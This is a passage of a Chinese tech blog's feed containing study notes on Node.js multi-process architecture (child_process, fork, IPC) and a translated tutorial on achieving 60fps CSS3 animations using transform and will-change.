<h3 id="9-1-3-白银时代：多线程"><a href="#9-1-3-白银时代：多线程" class="headerlink" title="9.1.3 白银时代：多线程"></a>9.1.3 白银时代：多线程</h3><p>为了解决进程复制中的浪费问题，多线程被引入服务模型，让一个线程服务一个请求。线程相对进程的开销要小许多，并且线程之间可以共享数据，内存浪费的问题可以得到解决，并且利用线程池可以减少创建和销毁线程的开销。但是多线程所面临的并发问题只能说比多进程略好，因为每个线程都拥有自己独立的堆栈，这个堆栈都需要占用一定的内存空间。另外，由于一个CPU核心在一个时刻只能做一件事情，操作系统只能通过将CPU切分为时间片的方法，让线程可以较为均匀地使用CPU资源，但是操作系统内核在切换线程的同时也要切换线程的上下文，当线程数量过多时，时间将会被耗用在上下文切换中。所以在大并发量时，多线程结构还是无法做到强大的伸缩性。如果忽略掉多线程上下文切换的开销，假设线程所占用的资源为进程的1/L，受资源上限的影响，它的QPS则为M * L/N。</p>
<h3 id="9-1-4-黄金时代：事件驱动"><a href="#9-1-4-黄金时代：事件驱动" class="headerlink" title="9.1.4 黄金时代：事件驱动"></a>9.1.4 黄金时代：事件驱动</h3><p>多线程的服务模型服役了很长一段时间，Apache就是采用多线程/多进程模型实现的，当并发增长到上万时，内存耗用的问题将会暴露出来，这即是著名的C10k问题。为了解决高并发问题，基于事件驱动的服务模型出现了，像Node与Nginx均是基于事件驱动的方式实现的，采用单线程避免了不必要的内存开销和上下文切换开销。<br>基于事件的服务模型存在的问题即是本章起始时提及的两个问题：CPU的利用率和进程的健壮性。单线程的架构并不少见，其中尤以PHP最为知名——在PHP中没有线程的支持。它的健壮性是由它给每个请求都建立独立的上下文来实现的。但是对于Node来说，所有请求的上下文都是统一的，它的稳定性是亟需解决的问题。由于所有处理都在单线程上进行，影响事件驱动服务模型性能的点在于CPU的计算能力，它的上限决定这类服务模型的性能上限，但它不受多进程或多线程模式中资源上限的影响，可伸缩性远比前两者高。如果解决掉多核CPU的利用问题，带来的性能上提升是可观的。</p>
<h3 id="9-2-多进程架构"><a href="#9-2-多进程架构" class="headerlink" title="9.2 多进程架构"></a>9.2 多进程架构</h3><h3 id="多进程架构"><a href="#多进程架构" class="headerlink" title="多进程架构"></a>多进程架构</h3><p>面对单进程单线程对多核使用不足的问题，前人的经验是启动多进程即可。理想状态下每个进程各自利用一个CPU，以此实现多核CPU的利用。所幸，Node提供了<code>child_process</code> 模块，并且也提供了<code>child_process.fork()</code> 函数供我们实现进程的复制。我们再一次将经典的示例代码存为worker.js文件，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</div><div class="line">http.createServer(<span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">  res.writeHead(<span class="number">200</span>, &#123;</div><div class="line">    <span class="string">'Content-Type'</span>: <span class="string">'text/plain'</span></div><div class="line">  &#125;);</div><div class="line">  res.end(<span class="string">'Hello World\n'</span>);</div><div class="line">&#125;).listen(<span class="built_in">Math</span>.round((<span class="number">1</span> + <span class="built_in">Math</span>.random()) * <span class="number">1000</span>), <span class="string">'127.0.0.1'</span>);</div></pre></td></tr></table></figure>
<p>通过node worker.js启动它，将会侦听1000到2000之间的一个随机端口。<br>将以下代码存为master.js，并通过node master.js启动它：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> fork = <span class="built_in">require</span>(<span class="string">'child_process'</span>).fork;</div><div class="line"><span class="keyword">var</span> cpus = <span class="built_in">require</span>(<span class="string">'os'</span>).cpus();</div><div class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; cpus.length; i++) &#123;</div><div class="line">  fork(<span class="string">'./worker.js'</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这段代码将会根据当前机器上的CPU数量复制出对应Node进程数。在*nix系统下可以通过</p>
<p><code>ps aux | grep worker.js</code> 查看到进程的数量，如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">$ ps aux | grep worker.js</div></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">jacksontian 1475 0.0 0.0 2432768 600 s003 S+ 3:27AM 0:00.00 </div><div class="line"></div><div class="line">grep worker.js jacksontian 1440 0.0 0.2 3022452 12680 s003 S 3:25AM 0:00.14 </div><div class="line"></div><div class="line">/usr/<span class="built_in">local</span>/bin/node ./worker.js</div><div class="line">jacksontian 1439 0.0 0.2 3023476 12716 s003 S 3:25AM 0:00.14 </div><div class="line">/usr/<span class="built_in">local</span>/bin/node ./worker.js </div><div class="line">jacksontian 1438 0.0 0.2 3022452 12704 s003 S 3:25AM 0:00.14 </div><div class="line">/usr/<span class="built_in">local</span>/bin/node ./worker.js</div><div class="line">jacksontian 1437 0.0 0.2 3031668 12696 s003 S 3:25AM 0:00.15 </div><div class="line">/usr/<span class="built_in">local</span>/bin/node ./worker.js</div></pre></td></tr></table></figure>
<p>图9-1就是著名的Master-Worker模式，又称主从模式。图9-1中的进程分为两种：主进程和工作进程。</p>
<p>这是典型的分布式架构中用于并行处理业务的模式，具备较好的可伸缩性和稳定性。主进程不负责具体的业务处理，而是负责调度或管理工作进程，它是趋向于稳定的。工作进程负责具体的业务处理，因为业务的多种多样，甚至一项业务由多人开发完成，所以工作进程的稳定性值得开发者关注。</p>
<p>图9-1　Master-Worker模式通过fork()复制的进程都是一个独立的进程，这个进程中有着独立而全新的V8实例。它需要至少30毫秒的启动时间和至少10 MB的内存。尽管Node提供了fork()供我们复制进程使每个CPU内核都使用上，但是依然要切记fork()进程是昂贵的。好在Node通过事件驱动的方式在单线程上解决了大并发的问题，这里启动多个进程只是为了充分将CPU资源利用起来，而不是为了解决并发问题。</p>
<h3 id="9-2-1-创建子进程"><a href="#9-2-1-创建子进程" class="headerlink" title="9.2.1 创建子进程"></a>9.2.1 创建子进程</h3><p>创建子进程<br><code>child_process</code> 模块给予Node可以随意创建子进程（<code>child_process</code>）的能力。它提供了4个方法用于创建子进程。</p>
<ul>
<li>spawn()：启动一个子进程来执行命令。</li>
<li>exec()：启动一个子进程来执行命令，与spawn()不同的是其接口不同，它有一个回调函数获知子进程的状况。</li>
<li>execFile()：启动一个子进程来执行可执行文件。</li>
<li>fork()：与spawn()类似，不同点在于它创建Node的子进程只需指定要执行的JavaScript文件模块即可。</li>
</ul>
<p>spawn()与exec()、execFile()不同的是，后两者创建时可以指定timeout属性设置超时时间，一旦创建的进程运行超过设定的时间将会被杀死。</p>
<p>exec()与execFile()不同的是，exec()适合执行已有的命令，execFile()适合执行文件。这里我们以一个寻常命令为例，<code>node worker.js</code> 分别用上述4种方法实现，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> cp = <span class="built_in">require</span>(<span class="string">'child_process'</span>);</div><div class="line">cp.spawn(<span class="string">'node'</span>, [<span class="string">'worker.js'</span>]);</div><div class="line">cp.exec(<span class="string">'node worker.js'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">err, stdout, stderr</span>) </span>&#123;</div><div class="line">  <span class="comment">// some code </span></div><div class="line">&#125;);</div><div class="line">cp.execFile(<span class="string">'worker.js'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">err, stdout, stderr</span>) </span>&#123; </div><div class="line">  <span class="comment">// some code</span></div><div class="line">&#125;);</div><div class="line">cp.fork(<span class="string">'./worker.js'</span>);</div></pre></td></tr></table></figure>
<p>以上4个方法在创建子进程之后均会返回子进程对象。它们的差别可以通过表9-1查看。</p>
<p>这里的可执行文件是指可以直接执行的文件，如果是JavaScript文件通过<code>execFile()</code>运行，它的首行内容必须添加如下代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">#!/usr/bin/env node</div></pre></td></tr></table></figure>
<p>尽管4种创建子进程的方式有些差别，但事实上后面3种方法都是spawn()的延伸应用。</p>
<h3 id="9-2-2-进程间通信"><a href="#9-2-2-进程间通信" class="headerlink" title="9.2.2 进程间通信"></a>9.2.2 进程间通信</h3><h3 id="进程间通信"><a href="#进程间通信" class="headerlink" title="进程间通信"></a>进程间通信</h3><p>在Master-Worker模式中，要实现主进程管理和调度工作进程的功能，需要主进程和工作进程之间的通信。对于child_process模块，创建好了子进程，然后与父子进程间通信是十分容易的。</p>
<p>在前端浏览器中，JavaScript主线程与UI渲染共用同一个线程。执行JavaScript的时候UI渲染是停滞的，渲染UI时，JavaScript是停滞的，两者互相阻塞。长时间执行JavaScript将会造成UI停顿不响应。为了解决这个问题，HTML5提出了WebWorker API。WebWorker允许创建工作线程并在后台运行，使得一些阻塞较为严重的计算不影响主线程上的UI渲染。它的API如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> worker = <span class="keyword">new</span> Worker(<span class="string">'worker.js'</span>);</div><div class="line">worker.onmessage = <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</div><div class="line">  <span class="built_in">document</span>.getElementById(<span class="string">'result'</span>).textContent = event.data;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>其中，worker.js如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> n = <span class="number">1</span>;</div><div class="line">search: <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</div><div class="line">  n += <span class="number">1</span>;</div><div class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">2</span>; i &lt;= <span class="built_in">Math</span>.sqrt(n); i += <span class="number">1</span>)</div><div class="line">    <span class="keyword">if</span> (n % i == <span class="number">0</span>)</div><div class="line">      <span class="keyword">continue</span> search; <span class="comment">// found a prime</span></div><div class="line">  postMessage(n);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>主线程与工作线程之间通过onmessage()和postMessage()进行通信，子进程对象则由send()方法实现主进程向子进程发送数据，message事件实现收听子进程发来的数据，与API在一定程度上相似。通过消息传递内容，而不是共享或直接操作相关资源，这是较为轻量和无依赖的做法。</p>
<p>Node中对应示例如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="comment">// parent.js var cp = require('child_process');</span></div><div class="line"><span class="keyword">var</span> n = cp.fork(__dirname + <span class="string">'/sub.js'</span>);</div><div class="line">n.on(<span class="string">'message'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">m</span>) </span>&#123;</div><div class="line">  <span class="built_in">console</span>.log(<span class="string">'PARENT got message:'</span>, m);</div><div class="line">&#125;);</div><div class="line">n.send(&#123;</div><div class="line">  <span class="attr">hello</span>: <span class="string">'world'</span></div><div class="line">&#125;); <span class="comment">// sub.js</span></div><div class="line">process.on(<span class="string">'message'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">m</span>) </span>&#123;</div><div class="line">  <span class="built_in">console</span>.log(<span class="string">'CHILD got message:'</span>, m);</div><div class="line">&#125;);</div><div class="line">process.send(&#123;</div><div class="line">  <span class="attr">foo</span>: <span class="string">'bar'</span></div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<p>通过fork()或者其他API，创建子进程之后，为了实现父子进程之间的通信，父进程与子进程之间将会创建IPC通道。通过IPC通道，父子进程之间才能通过message和send()传递消息。</p>
<h3 id="进程间通信原理"><a href="#进程间通信原理" class="headerlink" title="进程间通信原理"></a>进程间通信原理</h3><p><strong>IPC</strong>的全称是<strong>Inter-Process Communication</strong>，即进程间通信</p>
<p>进程间通信的目的是为了让不同的进程能够互相访问资源并进行协调工作。</p>
<p>实现进程间通信的技术有很多，如<strong>命名管道</strong>、<strong>匿名管道</strong>、<strong>socket</strong>、<strong>信号量</strong>、<strong>共享内存</strong>、<strong>消息队列</strong>、<strong>Domain Socket</strong> 等。</p>
<p>Node中实现IPC通道的是管道（pipe）技术。但此管道非彼管道，在Node中管道是个抽象层面的称呼，具体细节实现由libuv提供，在Windows下由命名管道（named pipe）实现，*nix系统则采用Unix Domain Socket实现。表现在应用层上的进程间通信只有简单的message事件和send()方法，接口十分简洁和消息化。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;深入浅出Node-js&quot;&gt;&lt;a href=&quot;#深入浅出Node-js&quot; class=&quot;headerlink&quot; title=&quot;深入浅出Node.js&quot;&gt;&lt;/a&gt;深入浅出Node.js&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;朴灵&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&quot;1-
    
    </summary>
    
      <category term="Node" scheme="http://www.wanglinzhizhi.me/categories/Node/"/>
    
    
      <category term="JavaScript" scheme="http://www.wanglinzhizhi.me/tags/JavaScript/"/>
    
      <category term="Node" scheme="http://www.wanglinzhizhi.me/tags/Node/"/>
    
  </entry>
  
  <entry>
    <title>使用 CSS3实现60帧 的动画</title>
    <link href="http://www.wanglinzhizhi.me/2017/01/23/%E4%BD%BF%E7%94%A8%20CSS3%20%E5%AE%9E%E7%8E%B0%2060%20%E5%B8%A7%E7%9A%84%E5%8A%A8%E7%94%BB/"/>
    <id>http://www.wanglinzhizhi.me/2017/01/23/使用 CSS3 实现 60 帧的动画/</id>
    <published>2017-01-23T11:16:10.000Z</published>
    <updated>2017-02-18T07:23:39.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="如丝般顺滑：使用-CSS3-实现-60-帧的动画"><a href="#如丝般顺滑：使用-CSS3-实现-60-帧的动画" class="headerlink" title="如丝般顺滑：使用 CSS3 实现 60 帧的动画"></a>如丝般顺滑：使用 CSS3 实现 60 帧的动画</h2><p><em>2016-08-17</em> <em>yanni4night</em> <a href="http://mp.weixin.qq.com/s?__biz=MzA4NjE3MDg4OQ==&amp;mid=2650963599&amp;idx=1&amp;sn=bb28e6cf0e3146252313d22fe42cb885&amp;scene=0##" target="_blank" rel="external">奇舞周刊</a></p>
<p>编者按：本文由yanni4night在众成翻译平台上翻译，英文原文：<a href="https://medium.com/outsystems-experts/how-to-achieve-60-fps-animations-with-css3-db7b98610108#.vfuqpb6vu" target="_blank" rel="external">https://medium.com/outsystems-experts/how-to-achieve-60-fps-animations-with-css3-db7b98610108#.vfuqpb6vu</a></p>
<p>在移动端上实现动画很简单。</p>
<p>在移动端上正确地实现动画也比较简单…如果你采纳我们的建议的话。</p>
<p>虽然现在每个人都会使用 CSS3 实现动画，但许多人用的都不够恰当。很多应加以考虑的最佳实践常常被忽略，因为仍然有人不明白这些最佳实践的真正意义。</p>
<p>如今有这么多的设备规范，如果还不有针对性地优化你的代码，糟糕的用户体验将让你死无葬身之地。</p>
<p>记住：虽然市场上始终有一些高端的旗舰机在挑战性能极限，但你面对的仍将是和这些性能怪兽相比只是玩具一样的低端设备。</p>
<p>我们想帮助你正确地驾驭 CSS3。首先先要了解几件事。</p>
<h3 id="了解时间轴"><a href="#了解时间轴" class="headerlink" title="了解时间轴"></a>了解时间轴</h3><p>当渲染和处理 HTML 元素时，浏览器做了什么？这个时间轴叫做关键渲染路径。</p>
<p><img src="/images/60pfs/1.png" alt="img"></p>
<p>想达到流畅的动画效果我们需要关注修改属性对合成（Composite）阶段的影响，而不是其它阶段。</p>
<h4 id="1-样式"><a href="#1-样式" class="headerlink" title="1. 样式"></a>1. 样式</h4><p><img src="/images/60pfs/2.png" alt="img"><br>浏览器开始计算应用于元素的样式 —— 重计算样式。</p>
<h4 id="2-布局"><a href="#2-布局" class="headerlink" title="2. 布局"></a>2. 布局</h4><p><img src="/images/60pfs/3.png" alt="img"></p>
<p>下一步，浏览器开始为每个元素生成形状和位置 —— 布局。这是浏览器设置页面属性的地方，如 width 和 height，以及 margin 或者 left、top、right、bottom。</p>
<h4 id="3-渲染"><a href="#3-渲染" class="headerlink" title="3. 渲染"></a>3. 渲染</h4><p><img src="/images/60pfs/4.png" alt="img"></p>
<p>浏览器开始向层中填充像素。要使用的属性有 box-shadow，border-radius，color，background-color 等等。</p>
<h4 id="4-合成"><a href="#4-合成" class="headerlink" title="4. 合成"></a>4. 合成</h4><p>这就是你动手脚的地方了，因为浏览器开始把所有层画到屏幕上。</p>
<p><img src="/images/60pfs/5.png" alt="img"></p>
<p>现代浏览器能够通过使用 transform 和 opacity 完美运行 4 种样式。</p>
<ul>
<li>位置 — transform: translateX(<em>n</em>) translateY(<em>n</em>) translateZ(<em>n</em>);</li>
<li>缩放 — transform: scale(<em>n</em>);</li>
<li>旋转 — transform: rotate(<em>n</em> deg);</li>
<li>透明 — opacity: <em>n</em>;</li>
</ul>
<h3 id="如何达到-60-帧每秒"><a href="#如何达到-60-帧每秒" class="headerlink" title="如何达到 60 帧每秒"></a>如何达到 60 帧每秒</h3><p>想法有了，让我们撸起袖子开始干活吧。</p>
<p>我们从 HTML 开始，创建一个非常简单的结构，并把类名 app-menu 的元素放入类名 layout 的元素中。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"layout"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">”app-menu”</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">”header”</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div></pre></td></tr></table></figure>
<p><img src="/images/60pfs/6.gif" alt="img"></p>
<h3 id="错误做法"><a href="#错误做法" class="headerlink" title="错误做法"></a>错误做法</h3><figure class="highlight css"><table><tr><td class="code"><pre><div class="line"><span class="selector-class">.app-menu</span> &#123;</div><div class="line">  <span class="attribute">left</span>: -<span class="number">300px</span>;</div><div class="line">  <span class="attribute">transition</span>: left <span class="number">300ms</span> linear;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="selector-class">.app-menu-open</span> <span class="selector-class">.app-menu</span> &#123;</div><div class="line">  <span class="attribute">left</span>: <span class="number">0px</span>;</div><div class="line">  <span class="attribute">transition</span>: left <span class="number">300ms</span> linear;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>看到我们更改的这些属性了吗？你应该避免在 transitions 中使用left、top、right、bottom 属性。它们的更新让浏览器每次都要创建布局，影响所有它们的子元素，进而难以实现流畅的动画。</p>
<p>结果是这样的：</p>
<p><img src="/images/60pfs/7.gif" alt="img"><br>这个动画一点也不流畅。我们通过<a href="undefined">开发者工具</a>检查背后到底发生了什么，请看：</p>
<p><img src="/images/60pfs/8.png" alt="img"></p>
<p>能够清晰地看到 FPS 非常不规则，性能也就比较糟糕。</p>
<h3 id="使用-Transform"><a href="#使用-Transform" class="headerlink" title="使用 Transform"></a>使用 Transform</h3><figure class="highlight css"><table><tr><td class="code"><pre><div class="line"><span class="selector-class">.app-menu</span> &#123;</div><div class="line">  <span class="attribute">-webkit-transform</span>: <span class="built_in">translateX</span>(-100%);</div><div class="line">  <span class="attribute">transform</span>: <span class="built_in">translateX</span>(-100%);</div><div class="line">  <span class="attribute">transition</span>: transform <span class="number">300ms</span> linear;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="selector-class">.app-menu-open</span> <span class="selector-class">.app-menu</span> &#123;</div><div class="line">  <span class="attribute">-webkit-transform</span>: none;</div><div class="line">  <span class="attribute">transform</span>: none;</div><div class="line">  <span class="attribute">transition</span>: transform <span class="number">300ms</span> linear;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>transform 属性会影响合成阶段。在这里浏览器被告知层马上要被渲染，做好准备执行动画，因此动画渲染时卡顿更少。</p>
<p><img src="/images/60fps/9.gif" alt="img"></p>
<p>时间轴：</p>
<p><img src="/images/60fps/10.png" alt="img"></p>
<p>开始有效果了，FPS 变得有规律了，此外，动画变得更流畅了。</p>
<p>FPS 开始优化，并且更加稳定，动画也更流畅。</p>
<h3 id="使用-GPU-执行动画"><a href="#使用-GPU-执行动画" class="headerlink" title="使用 GPU 执行动画"></a>使用 GPU 执行动画</h3><p>百尺竿头更进一步。为了让动画“如丝般顺滑”，我们接下来使用 GPU 来渲染。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><div class="line"><span class="selector-class">.app-menu</span> &#123;</div><div class="line">  <span class="attribute">-webkit-transform</span>: <span class="built_in">translateX</span>(-100%);</div><div class="line">          <span class="attribute">transform</span>: <span class="built_in">translateX</span>(-100%);</div><div class="line">  <span class="attribute">transition</span>: transform <span class="number">300ms</span> linear;</div><div class="line">  <span class="attribute">will-change</span>: transform;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>虽然一些浏览器仍然需要 translateZ() 或 translate3d() 作为备选方案，will-change 被广泛支持已经是势不可挡了。它的功能是把元素提升到另一个层中，这样浏览器就不必关心布局渲染或者绘制了。</p>
<p><img src="/images/11.gif" alt="img"></p>
<p>这样动画能流畅到什么程度？看时间轴：</p>
<p><img src="/images/12.png" alt="img"></p>
<p>动画的 FPS 更稳定了，渲染也更快了。但是有一帧仍然渲染得很久。在开始处还有一点点瓶颈。</p>
<p>记住刚开始创建的 HTML 结构吗？我们用 JavaScript 控制 app-menu div。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">toggleClassMenu</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> layout = <span class="built_in">document</span>.querySelector(<span class="string">".layout"</span>);</div><div class="line">  <span class="keyword">if</span>(!layout.classList.contains(<span class="string">"app-menu-open"</span>)) &#123;</div><div class="line">    layout.classList.add(<span class="string">"app-menu-open"</span>);</div><div class="line">  &#125; <span class="keyword">else</span> &#123;</div><div class="line">    layout.classList.remove(<span class="string">"app-menu-open"</span>);</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">var</span> oppMenu = <span class="built_in">document</span>.querySelector(<span class="string">".menu-icon"</span>);</div><div class="line"></div><div class="line">oppMenu.addEventListener(<span class="string">"click"</span>, toggleClassMenu, <span class="literal">false</span>);</div></pre></td></tr></table></figure>
<p>问题出在对 layout 元素增加类名上，我们使浏览器计算了不止一次样式 —— 这影响了渲染效果。</p>
<h3 id="如丝般顺滑的-60-帧-FPS"><a href="#如丝般顺滑的-60-帧-FPS" class="headerlink" title="如丝般顺滑的 60 帧 FPS"></a>如丝般顺滑的 60 帧 FPS</h3><p>如果我们在视窗之外创建菜单会如何？这种分离化的区域能够保证只有需要做动画的元素才会被影响。</p>
<p>因此，我们改进下面的 HTML 结构：</p>
<figure class="highlight"><table><tr><td class="code"><pre><div class="line">&lt;div class="menu"&gt;</div><div class="line">    &lt;div class="app-menu"&gt;&lt;/div&gt;</div><div class="line">&lt;/div&gt;</div><div class="line"></div><div class="line">&lt;div class="layout"&gt;</div><div class="line">    &lt;div class="header"&gt;&lt;/div&gt;</div><div class="line">&lt;/div&gt;</div></pre></td></tr></table></figure>
<p>此外你也可以通过一种略有不同的方式去控制菜单的状态。我们通过 JavaScript 的transitionend 方法，在监控到动画结束时移除这个控制动画的 CSS 类。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">toggleClassMenu</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  myMenu.classList.add(<span class="string">"menu--animatable"</span>);</div><div class="line">  myMenu.classList.add(<span class="string">"menu--visible"</span>);</div><div class="line">  myMenu.addEventListener(<span class="string">"transitionend"</span>, </div><div class="line">  OnTransitionEnd, <span class="literal">false</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">OnTransitionEnd</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  myMenu.classList.remove(<span class="string">"menu--animatable"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">var</span> myMenu = <span class="built_in">document</span>.querySelector(<span class="string">".menu"</span>);</div><div class="line"></div><div class="line"><span class="keyword">var</span> oppMenu = <span class="built_in">document</span>.querySelector(<span class="string">".menu-icon"</span>);</div><div class="line"></div><div class="line">oppMenu.addEventListener(<span class="string">"click"</span>, toggleClassMenu, <span class="literal">false</span>);</div></pre></td></tr></table></figure>
<p>现在把它们放到一起，然后看效果。</p>
<p>下面是完全正确的使用 CSS3 实现动画的例子：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><div class="line"><span class="selector-class">.menu</span> &#123;</div><div class="line">  <span class="attribute">position</span>: fixed;</div><div class="line">  <span class="attribute">left</span>: <span class="number">0</span>;</div><div class="line">  <span class="attribute">top</span>: <span class="number">0</span>;</div><div class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</div><div class="line">  <span class="attribute">height</span>: <span class="number">100%</span>;</div><div class="line">  <span class="attribute">overflow</span>: hidden;</div><div class="line">  <span class="attribute">pointer-events</span>: none;</div><div class="line">  <span class="attribute">z-index</span>: <span class="number">150</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="selector-class">.menu</span>—<span class="selector-tag">visible</span> &#123;</div><div class="line">  <span class="attribute">pointer-events</span>: auto;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="selector-class">.app-menu</span> &#123;</div><div class="line">  <span class="attribute">background-color</span>: <span class="number">#fff</span>;</div><div class="line">  <span class="attribute">color</span>: <span class="number">#fff</span>;</div><div class="line">  <span class="attribute">position</span>: relative;</div><div class="line">  <span class="attribute">max-width</span>: <span class="number">400px</span>;</div><div class="line">  <span class="attribute">width</span>: <span class="number">90%</span>;</div><div class="line">  <span class="attribute">height</span>: <span class="number">100%</span>;</div><div class="line">  <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">2px</span> <span class="number">6px</span> <span class="built_in">rgba</span>(0, 0, 0, 0.5);</div><div class="line">  <span class="attribute">-webkit-transform</span>: <span class="built_in">translateX</span>(-103%);</div><div class="line">  <span class="attribute">transform</span>: <span class="built_in">translateX</span>(-103%);</div><div class="line">  <span class="attribute">display</span>: flex;</div><div class="line">  <span class="attribute">flex-direction</span>: column;</div><div class="line">  <span class="attribute">will-change</span>: transform;</div><div class="line">  <span class="attribute">z-index</span>: <span class="number">160</span>;</div><div class="line">  <span class="attribute">pointer-events</span>: auto;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="selector-class">.menu</span>—<span class="selector-tag">-visible</span><span class="selector-class">.app-menu</span> &#123;</div><div class="line">  <span class="attribute">-webkit-transform</span>: none;</div><div class="line">  <span class="attribute">transform</span>: none;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="selector-class">.menu-</span>—<span class="selector-tag">animatable</span><span class="selector-class">.app-menu</span> &#123;</div><div class="line">  <span class="attribute">transition</span>: all <span class="number">130ms</span> ease-in;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="selector-class">.menu--visible</span><span class="selector-class">.menu</span>—<span class="selector-tag">-animatable</span><span class="selector-class">.app-menu</span> &#123;</div><div class="line">  <span class="attribute">transition</span>: all <span class="number">330ms</span> ease-out;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="selector-class">.menu</span><span class="selector-pseudo">:after</span> &#123;</div><div class="line">  <span class="attribute">content</span>: ‘’;</div><div class="line">  <span class="attribute">display</span>: block;</div><div class="line">  <span class="attribute">position</span>: absolute;</div><div class="line">  <span class="attribute">left</span>: <span class="number">0</span>;</div><div class="line">  <span class="attribute">top</span>: <span class="number">0</span>;</div><div class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</div><div class="line">  <span class="attribute">height</span>: <span class="number">100%</span>;</div><div class="line">  <span class="attribute">background</span>: <span class="built_in">rgba</span>(0,0,0,0.4);</div><div class="line">  <span class="attribute">opacity</span>: <span class="number">0</span>;</div><div class="line">  <span class="attribute">will-change</span>: opacity;</div><div class="line">  <span class="attribute">pointer-events</span>: none;</div><div class="line">  <span class="attribute">transition</span>: opacity <span class="number">0.3s</span> <span class="built_in">cubic-bezier</span>(0,0,0.3,1);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="selector-class">.menu</span><span class="selector-class">.menu--visible</span><span class="selector-pseudo">:after</span>&#123;</div><div class="line">  <span class="attribute">opacity</span>: <span class="number">1</span>;</div><div class="line">  <span class="attribute">pointer-events</span>: auto;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><img src="/images/60pfs/13.gif" alt="img"></p>
<p>时间轴是怎么样的？</p>
<p><img src="/images/60pfs/14.png" alt="img"></p>
<p>如丝般地顺滑，是吧？</p>
<p><strong>Note</strong>: 我跟着做了一遍,demo Git地址: <a href="https://www.yichewx.com/gogs/wanglinzhizhi/high-performance-css3" target="_blank" rel="external">https://www.yichewx.com/gogs/wanglinzhizhi/high-performance-css3</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;如丝般顺滑：使用-CSS3-实现-60-帧的动画&quot;&gt;&lt;a href=&quot;#如丝般顺滑：使用-CSS3-实现-60-帧的动画&quot; class=&quot;headerlink&quot; title=&quot;如丝般顺滑：使用 CSS3 实现 60 帧的动画&quot;&gt;&lt;/a&gt;如丝般顺滑：使用 CSS3 
    
    </summary>
    
      <category term="Web" scheme="http://www.wanglinzhizhi.me/categories/Web/"/>
    
    
      <category term="算法" scheme="http://www.wanglinzhizhi.me/tags/%E7%AE%97%E6%B3%95/"/>
    
      <category term="CSS3" scheme="http://www.wanglinzhizhi.me/tags/CSS3/"/>
    
      <category term="移动Web" scheme="http://www.wanglinzhizhi.me/tags/%E7%A7%BB%E5%8A%A8Web/"/>
    
  </entry>
  
  <entry>
    <title>ie8的 奇怪的地方</title>
